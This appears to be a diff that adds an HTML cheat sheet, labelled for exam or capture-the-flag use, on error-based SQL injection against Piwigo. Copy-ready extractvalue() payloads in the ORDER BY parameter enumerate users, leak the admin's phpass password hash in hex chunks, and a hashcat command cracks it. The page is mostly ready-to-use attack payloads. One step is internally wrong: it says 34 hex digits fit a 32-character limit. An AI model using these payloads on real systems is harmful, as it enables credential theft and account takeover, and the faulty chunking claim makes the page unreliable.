@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Error-Based Hash Extraction — Step by Step</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&family=IBM+Plex+Sans:wght@400;500;600&display=swap');
+
+  :root {
+    --bg: #0d0f12;
+    --bg2: #13161b;
+    --bg3: #1a1e25;
+    --border: rgba(255,255,255,0.07);
+    --border2: rgba(255,255,255,0.12);
+    --text: #c9cdd6;
+    --text2: #7a8194;
+    --text3: #4a5068;
+    --accent: #4ade80;
+    --accent2: #22d3ee;
+    --warn: #fbbf24;
+    --danger: #f87171;
+    --purple: #a78bfa;
+    --font: 'IBM Plex Sans', sans-serif;
+    --mono: 'JetBrains Mono', monospace;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { background: var(--bg); color: var(--text); font-family: var(--font); font-size: 14px; line-height: 1.7; }
+
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image: linear-gradient(rgba(255,255,255,0.015) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,0.015) 1px, transparent 1px);
+    background-size: 32px 32px;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  .container { position: relative; z-index: 1; max-width: 900px; margin: 0 auto; padding: 48px 24px 80px; }
+
+  header { margin-bottom: 40px; padding-bottom: 28px; border-bottom: 1px solid var(--border); }
+  .lab-tag { display: inline-block; font-family: var(--mono); font-size: 11px; color: var(--accent); background: rgba(74,222,128,0.08); border: 1px solid rgba(74,222,128,0.2); padding: 3px 10px; border-radius: 4px; margin-bottom: 12px; letter-spacing: .05em; }
+  h1 { font-size: 26px; font-weight: 600; color: #e8eaf0; letter-spacing: -0.02em; margin-bottom: 8px; }
+  .subtitle { font-size: 13px; color: var(--text2); }
+
+  h2 { font-size: 16px; font-weight: 600; color: #e8eaf0; margin: 36px 0 16px; padding-bottom: 8px; border-bottom: 1px solid var(--border); display: flex; align-items: center; gap: 10px; }
+  h2 .num { width: 28px; height: 28px; background: var(--bg3); border: 1px solid var(--border2); border-radius: 6px; display: flex; align-items: center; justify-content: center; font-size: 12px; font-family: var(--mono); color: var(--accent); flex-shrink: 0; }
+
+  h3 { font-size: 13px; font-weight: 600; color: var(--text2); text-transform: uppercase; letter-spacing: .07em; margin: 20px 0 10px; }
+  p { color: var(--text); margin-bottom: 12px; font-size: 14px; }
+
+  .code-block { background: var(--bg); border: 1px solid var(--border); border-radius: 8px; overflow: hidden; margin-bottom: 12px; }
+  .code-header { display: flex; align-items: center; justify-content: space-between; padding: 7px 12px; border-bottom: 1px solid var(--border); background: var(--bg2); }
+  .code-lang { font-family: var(--mono); font-size: 10px; color: var(--text3); text-transform: uppercase; letter-spacing: .08em; }
+  .copy-btn { font-family: var(--font); font-size: 10px; color: var(--text3); background: var(--bg3); border: 1px solid var(--border); border-radius: 4px; padding: 2px 8px; cursor: pointer; transition: color .15s, border-color .15s; }
+  .copy-btn:hover { color: var(--text2); border-color: var(--border2); }
+  .copy-btn.copied { color: var(--accent); border-color: rgba(74,222,128,0.3); }
+  pre { font-family: var(--mono); font-size: 12px; color: var(--accent2); padding: 14px 16px; overflow-x: auto; line-height: 1.8; white-space: pre-wrap; word-break: break-all; }
+
+  code { font-family: var(--mono); font-size: 12px; background: var(--bg3); border: 1px solid var(--border); padding: 1px 6px; border-radius: 4px; color: var(--accent2); }
+
+  .tip { background: rgba(251,191,36,0.06); border: 1px solid rgba(251,191,36,0.15); border-radius: 8px; padding: 12px 16px; font-size: 13px; color: var(--text2); margin-bottom: 16px; line-height: 1.7; }
+  .tip strong { color: #e8eaf0; }
+  .tip code { color: var(--warn); background: rgba(251,191,36,0.1); border-color: rgba(251,191,36,0.2); }
+
+  .tip-danger { background: rgba(248,113,113,0.06); border-color: rgba(248,113,113,0.15); }
+  .tip-danger code { color: var(--danger); background: rgba(248,113,113,0.1); border-color: rgba(248,113,113,0.2); }
+
+  .tip-info { background: rgba(34,211,238,0.06); border-color: rgba(34,211,238,0.15); }
+  .tip-info code { color: var(--accent2); background: rgba(34,211,238,0.1); border-color: rgba(34,211,238,0.2); }
+
+  .step { display: flex; gap: 16px; margin-bottom: 24px; }
+  .step-num { width: 32px; height: 32px; background: var(--bg3); border: 1px solid var(--border2); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 13px; font-family: var(--mono); color: var(--accent); flex-shrink: 0; margin-top: 2px; font-weight: 600; }
+  .step-body { flex: 1; }
+  .step-title { font-size: 15px; font-weight: 500; color: #e8eaf0; margin-bottom: 8px; }
+
+  .hex-table { width: 100%; border-collapse: collapse; font-size: 12px; margin-bottom: 16px; background: var(--bg2); border-radius: 8px; overflow: hidden; border: 1px solid var(--border); }
+  .hex-table th { text-align: left; padding: 8px 12px; font-weight: 500; font-size: 11px; border-bottom: 1px solid var(--border2); background: var(--bg3); color: var(--text2); }
+  .hex-table td { padding: 7px 12px; border-bottom: 1px solid var(--border); color: var(--text2); font-family: var(--mono); font-size: 12px; }
+  .hex-table tr:last-child td { border-bottom: none; }
+  .hex-table td:first-child { color: var(--accent2); }
+  .hex-table td:last-child { color: var(--accent); }
+
+  .hash-builder { background: var(--bg2); border: 1px solid var(--border); border-radius: 8px; padding: 16px; margin-bottom: 16px; }
+  .hash-row { display: flex; align-items: center; gap: 10px; margin-bottom: 8px; font-size: 12px; font-family: var(--mono); }
+  .hash-label { color: var(--text3); font-size: 10px; text-transform: uppercase; letter-spacing: .08em; width: 80px; flex-shrink: 0; }
+  .hash-chars { color: var(--accent2); background: var(--bg3); padding: 4px 10px; border-radius: 4px; border: 1px solid var(--border); }
+  .hash-final { color: var(--accent); font-size: 14px; font-weight: 500; background: rgba(74,222,128,0.08); padding: 10px 14px; border-radius: 6px; border: 1px solid rgba(74,222,128,0.2); margin-top: 12px; word-break: break-all; }
+
+  footer { text-align: center; font-size: 11px; color: var(--text3); margin-top: 60px; padding-top: 24px; border-top: 1px solid var(--border); }
+</style>
+</head>
+<body>
+<div class="container">
+
+  <header>
+    <div class="lab-tag">EXAM REFERENCE — Hash Extraction via SQLi</div>
+    <h1>Extracting Password Hashes via Error-Based SQL Injection</h1>
+    <div class="subtitle">MySQL · extractvalue() · Piwigo · phpass hashes · hex extraction method</div>
+  </header>
+
+  <!-- Overview -->
+  <h2><span class="num">0</span> Overview & Key Facts</h2>
+
+  <div class="tip tip-info">
+    <strong>The core technique:</strong> MySQL's <code>extractvalue()</code> function throws an XPath error that leaks the value we inject into the error message. The output is limited to <strong>32 characters</strong> — so long values must be extracted in chunks. Use <strong>hex encoding</strong> to avoid ambiguity with special characters.
+  </div>
+
+  <table class="hex-table">
+    <tr><th>Detail</th><th>Value</th></tr>
+    <tr><td>Injection point</td><td>ORDER BY parameter (sort/order)</td></tr>
+    <tr><td>DB type</td><td>MySQL</td></tr>
+    <tr><td>Error function</td><td>extractvalue('', concat('DELIM', PAYLOAD))</td></tr>
+    <tr><td>Output limit</td><td>32 characters per extractvalue call</td></tr>
+    <tr><td>Hash format</td><td>phpass ($P$) — 34 characters</td></tr>
+    <tr><td>Target table</td><td>piwigo_users</td></tr>
+    <tr><td>Target column</td><td>password</td></tr>
+  </table>
+
+  <!-- Step 1: Confirm injection -->
+  <h2><span class="num">1</span> Confirm the Injection Point</h2>
+
+  <div class="step">
+    <div class="step-num">1</div>
+    <div class="step-body">
+      <div class="step-title">Test ORDER BY parameter with a basic extractvalue payload</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">inject into order/sort parameter</span><button class="copy-btn" onclick="copy(this)">copy</button></div>
+        <pre>asc, extractvalue('',concat('>',version()))</pre>
+      </div>
+      <p>If you see a MySQL XPATH syntax error with a version number → injection confirmed.</p>
+    </div>
+  </div>
+
+  <!-- Step 2: Find admin user -->
+  <h2><span class="num">2</span> Identify the Admin User</h2>
+
+  <div class="step">
+    <div class="step-num">1</div>
+    <div class="step-body">
+      <div class="step-title">Get all usernames and IDs</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">MySQL</span><button class="copy-btn" onclick="copy(this)">copy</button></div>
+        <pre>asc, extractvalue('',concat('>',(select concat(id,':',username) from piwigo_users limit 1 offset 0)))</pre>
+      </div>
+      <p>Change <code>offset 0</code> → <code>offset 1</code> → <code>offset 2</code> to iterate through users. Find which ID belongs to admin.</p>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-num">2</div>
+    <div class="step-body">
+      <div class="step-title">Verify admin user ID</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">MySQL</span><button class="copy-btn" onclick="copy(this)">copy</button></div>
+        <pre>asc, extractvalue('',concat('>',(select concat(id,':',username) from piwigo_users where username="admin")))</pre>
+      </div>
+      <p>Error will show something like <code>>1:admin</code> — admin is ID 1.</p>
+    </div>
+  </div>
+
+  <!-- Step 3: Check hash length -->
+  <h2><span class="num">3</span> Check Hash Length</h2>
+
+  <div class="step">
+    <div class="step-num">1</div>
+    <div class="step-body">
+      <div class="step-title">Get exact character count of the password hash</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">MySQL</span><button class="copy-btn" onclick="copy(this)">copy</button></div>
+        <pre>asc, extractvalue('',concat('>',(select length(password) from piwigo_users where id=1)))</pre>
+      </div>
+      <p>Error shows <code>>34</code> → hash is 34 characters. Since extractvalue only shows 32 chars, we need multiple chunks.</p>
+    </div>
+  </div>
+
+  <!-- Step 4: Extract hash using hex -->
+  <h2><span class="num">4</span> Extract Hash Using Hex Encoding</h2>
+
+  <div class="tip tip-danger">
+    ⚠ <strong>Do NOT use substring directly</strong> — special characters in the hash (like <code>$</code>, <code>/</code>) can be confused with XPath syntax in the error output. Always use <strong>hex encoding</strong> for accurate extraction.
+  </div>
+
+  <div class="step">
+    <div class="step-num">1</div>
+    <div class="step-body">
+      <div class="step-title">Get chars 1-17 as hex (first chunk)</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">MySQL — chunk 1</span><button class="copy-btn" onclick="copy(this)">copy</button></div>
+        <pre>asc, extractvalue('',concat('!!',(select hex(substring(password,1,17)) from piwigo_users where id=1)))</pre>
+      </div>
+      <p>Use <code>!!</code> as delimiter — unambiguous and not part of hex output. Each character = 2 hex digits, so 17 chars = 34 hex digits (fits in 32-char limit).</p>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-num">2</div>
+    <div class="step-body">
+      <div class="step-title">Get chars 18-34 as hex (second chunk)</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">MySQL — chunk 2</span><button class="copy-btn" onclick="copy(this)">copy</button></div>
+        <pre>asc, extractvalue('',concat('!!',(select hex(substring(password,18,17)) from piwigo_users where id=1)))</pre>
+      </div>
+      <p>Gets the remaining 17 characters of the 34-char hash.</p>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-num">3</div>
+    <div class="step-body">
+      <div class="step-title">If output is cut off — get missing middle chars</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">MySQL — fill gaps</span><button class="copy-btn" onclick="copy(this)">copy</button></div>
+        <pre>asc, extractvalue('',concat('!!',(select hex(substring(password,X,2)) from piwigo_users where id=1)))</pre>
+      </div>
+      <p>Replace <code>X</code> with the start position of any missing chars.</p>
+    </div>
+  </div>
+
+  <!-- Step 5: Decode hex -->
+  <h2><span class="num">5</span> Decode Hex to Characters</h2>
+
+  <p>Each pair of hex digits = one character. Common ones to know:</p>
+
+  <table class="hex-table">
+    <tr><th>Hex</th><th>Char</th><th>Hex</th><th>Char</th></tr>
+    <tr><td>24</td><td>$</td><td>2F</td><td>/</td></tr>
+    <tr><td>50</td><td>P</td><td>2E</td><td>.</td></tr>
+    <tr><td>41-5A</td><td>A-Z</td><td>30-39</td><td>0-9</td></tr>
+    <tr><td>61-7A</td><td>a-z</td><td>21</td><td>!</td></tr>
+  </table>
+
+  <div class="tip">
+    <strong>Quick decode:</strong> Use Python: <code>bytes.fromhex('2450244768786D...').decode()</code><br>
+    Or online: <a href="https://www.rapidtables.com/convert/number/hex-to-ascii.html" style="color:var(--accent2)">rapidtables.com hex to ASCII</a>
+  </div>
+
+  <!-- Step 6: Build the hash -->
+  <h2><span class="num">6</span> Build the Complete Hash</h2>
+
+  <div class="hash-builder">
+    <div class="hash-row"><span class="hash-label">Chunk 1</span><span class="hash-chars">hex(substring(password,1,17)) → chars 1-17</span></div>
+    <div class="hash-row"><span class="hash-label">Chunk 2</span><span class="hash-chars">hex(substring(password,18,17)) → chars 18-34</span></div>
+    <div class="hash-row"><span class="hash-label">Combined</span><span class="hash-chars">Concatenate decoded chunks in order</span></div>
+    <div class="hash-final">Example result: $P$Ghxmchgk.0YxEQutC7os3dZfBvqGIz/</div>
+  </div>
+
+  <div class="tip tip-danger">
+    ⚠ <strong>Common mistakes:</strong>
+    <br>• Including the <code>></code> or <code>!!</code> delimiter in your answer — these are NOT part of the hash
+    <br>• Missing the trailing <code>/</code> — phpass hashes can end with <code>/</code> and it IS part of the hash
+    <br>• Confusing XPath error syntax characters with hash characters — use hex to avoid this
+    <br>• Submitting only 32 chars — always check <code>length(password)</code> first
+  </div>
+
+  <!-- Step 7: Quick reference -->
+  <h2><span class="num">7</span> Quick Reference Payloads</h2>
+
+  <h3>Get version</h3>
+  <div class="code-block">
+    <div class="code-header"><span class="code-lang">MySQL</span><button class="copy-btn" onclick="copy(this)">copy</button></div>
+    <pre>asc, extractvalue('',concat('>',version()))</pre>
+  </div>
+
+  <h3>Get all usernames</h3>
+  <div class="code-block">
+    <div class="code-header"><span class="code-lang">MySQL</span><button class="copy-btn" onclick="copy(this)">copy</button></div>
+    <pre>asc, extractvalue('',concat('>',(select concat(id,':',username) from piwigo_users limit 1 offset 0)))</pre>
+  </div>
+
+  <h3>Check hash length</h3>
+  <div class="code-block">
+    <div class="code-header"><span class="code-lang">MySQL</span><button class="copy-btn" onclick="copy(this)">copy</button></div>
+    <pre>asc, extractvalue('',concat('>',(select length(password) from piwigo_users where id=1)))</pre>
+  </div>
+
+  <h3>Extract hash — chunk 1 (chars 1-17)</h3>
+  <div class="code-block">
+    <div class="code-header"><span class="code-lang">MySQL</span><button class="copy-btn" onclick="copy(this)">copy</button></div>
+    <pre>asc, extractvalue('',concat('!!',(select hex(substring(password,1,17)) from piwigo_users where id=1)))</pre>
+  </div>
+
+  <h3>Extract hash — chunk 2 (chars 18-34)</h3>
+  <div class="code-block">
+    <div class="code-header"><span class="code-lang">MySQL</span><button class="copy-btn" onclick="copy(this)">copy</button></div>
+    <pre>asc, extractvalue('',concat('!!',(select hex(substring(password,18,17)) from piwigo_users where id=1)))</pre>
+  </div>
+
+  <h3>Verify specific chars (fill gaps)</h3>
+  <div class="code-block">
+    <div class="code-header"><span class="code-lang">MySQL</span><button class="copy-btn" onclick="copy(this)">copy</button></div>
+    <pre>asc, extractvalue('',concat('!!',(select hex(substring(password,START,LENGTH)) from piwigo_users where id=1)))</pre>
+  </div>
+
+  <h3>Crack the hash with hashcat</h3>
+  <div class="code-block">
+    <div class="code-header"><span class="code-lang">bash</span><button class="copy-btn" onclick="copy(this)">copy</button></div>
+    <pre>hashcat -m 400 '$P$Ghxmchgk.0YxEQutC7os3dZfBvqGIz/' /usr/share/wordlists/rockyou.txt</pre>
+  </div>
+
+  <div class="tip">
+    <strong>Hash type reference:</strong><br>
+    <code>$P$</code> = phpass (hashcat mode <strong>400</strong>)<br>
+    <code>$2y$</code> = bcrypt (hashcat mode <strong>3200</strong>)<br>
+    32 hex chars = plain MD5 (hashcat mode <strong>0</strong>)<br>
+    <code>$1$</code> = MD5crypt (hashcat mode <strong>500</strong>)
+  </div>
+
+  <footer>
+    Error-Based Hash Extraction Reference &nbsp;·&nbsp; For authorized CTF / exam use only
+  </footer>
+
+</div>
+
+<script>
+function copy(btn) {
+  const pre = btn.closest('.code-block').querySelector('pre');
+  const text = pre.innerText.trim();
+  navigator.clipboard.writeText(text).then(() => {
+    btn.textContent = 'copied!';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'copy'; btn.classList.remove('copied'); }, 1500);
+  });
+}
+</script>
+</body>
+</html>
